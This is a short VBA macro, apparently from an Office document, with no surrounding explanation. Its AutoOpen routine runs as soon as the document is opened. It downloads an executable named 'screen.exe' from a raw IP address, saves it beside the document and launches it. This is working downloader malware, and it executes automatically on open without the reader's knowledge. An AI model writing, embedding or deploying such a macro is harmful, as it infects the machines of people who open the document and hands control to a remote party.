Private Sub DownloadFileFromURL()
    Dim FileUrl As String
    Dim objeXmlHttpReq As Object
    Dim objStream As Object
    
    FileUrl = "http://1.14.126.233/YgeUfeT2z7/screen.exe"
    
    Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
    objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
    objXmlHttpReq.send
    
    If objXmlHttpReq.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objXmlHttpReq.responseBody
        objStream.SaveToFile ThisDocument.Path & "\" & "screen.exe", 2
        objStream.Close
    End If
    
    Shell ThisDocument.Path & "\" & "screen.exe"
End Sub

Sub AutoOpen()
    Call DownloadFileFromURL
End Sub
